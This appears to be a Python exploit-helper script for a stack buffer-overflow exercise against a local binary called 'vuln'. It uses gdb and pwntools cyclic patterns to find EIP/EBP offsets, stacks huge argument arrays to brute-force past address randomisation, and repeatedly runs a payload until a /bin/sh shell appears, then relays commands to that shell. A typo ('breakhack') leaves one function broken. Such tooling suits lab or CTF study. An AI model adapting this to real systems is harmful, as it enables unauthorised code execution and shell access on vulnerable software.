import subprocess
import struct
import os
import re
import sys
import pty
import select
from pwn import *

PINK = "\033[95m"
RESET = "\033[0m"

log_file_path = 'strace.log'


def generate_test(vuln):
    pattern = cyclic(1000)
    # print(pattern)

    gdb_proc = subprocess.Popen([f"gdb {vuln}"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    commands = f"""
    set pagination off  #disabling pagination for uninterrupted output
    r
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    if eip_value:
        print(f"Extracted EIP value: {eip_value}")

    eip_int = int(eip_value, 16)
    offset = cyclic_find(eip_int)
    print(f"eip offset: {offset}")

    ebp_value = None
    for line in output.splitlines():
        if "ebp" in line:  # Find the line with 'eip'
            ebp_value = line.split()[1]  # Extract the hexadecimal value (second column)
            breakhack

    if ebp_value:
        print(f"Extracted EBP value: {ebp_value}")

    ebp_int = int(ebp_value, 16)
    offset = cyclic_find(ebp_int)
    print(f"ebp offset: {offset}")

def target_ra(vuln):

    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)  

    gdb_process = subprocess.Popen(f"gdb {vuln}", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output


def detect_execve():
    print(f"{PINK}~~~~~~~~~~~~~~~~~~~~~~~~~~~~{RESET}")


    pattern = re.compile(
        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()

            for line in lines:
                print(line)
                if pattern.search(line):
                    print(f"{PINK}{line}{RESET}")
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        sys.exit(1)

    return False





def main():
    # 💖 Super girly code incoming 💖

    # generate_test("vuln")
    # target_ra("vuln")

    # trash = b'B'*131000
    # # trash_args = "`cat trash` " * 15    
    # open("trash", "wb").write(trash)  
    exploit_command = f"cat vuln_payload - | ./vuln `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash` `cat trash`"

    i = 0
    while True:
        print(f"i: {i}")
        i += 1

        master_fd, slave_fd = pty.openpty()
        exploit_proc = subprocess.Popen(
            f"strace -ff -e trace=all {exploit_command}", 
            shell=True, close_fds=True, stdin=slave_fd, stdout=slave_fd, stderr=slave_fd)
        
        os.write(master_fd, b'\n')

        while True:
            rlist, _, _ = select.select([master_fd, 0], [], [], 0.1)

            if master_fd in rlist:
                output = os.read(master_fd, 100000)
                if output:
                    print(f"{PINK}Output from PTY:{RESET}")
                    print(output)
                    if b'Segmentation fault' in output:
                        exploit_proc.terminate()
                        break

                else:
                    break  # No more output, process has likely exited

            if 0 in rlist:
                print("in 0!!!!!!!!")
                while True:
                    os.write(1, b'# ')
                    user_input = os.read(0, 5000)
                    
                    if b'exit' in user_input:
                            exploit_proc.terminate()
                            os.close(master_fd)
                            os.close(slave_fd)
                            os.remove("trash")
                            os.remove("vuln_payload")
                            sys.exit(1)
                    
                    os.write(master_fd, user_input)  # Forward user input to the exploit shell
                    rlist_response, _, _ = select.select([master_fd], [], [])

                    while master_fd in rlist_response:
                        response = os.read(master_fd, 1024)
                        response = response.replace(b'\r', b'')
                        if response != user_input:
                            os.write(1, response)
                            break

                        rlist_response, _, _ = select.select([master_fd], [], [])

        # Close file descriptors
        os.close(master_fd)
        os.close(slave_fd)

if __name__ == "__main__":
    # main()
    detect_execve()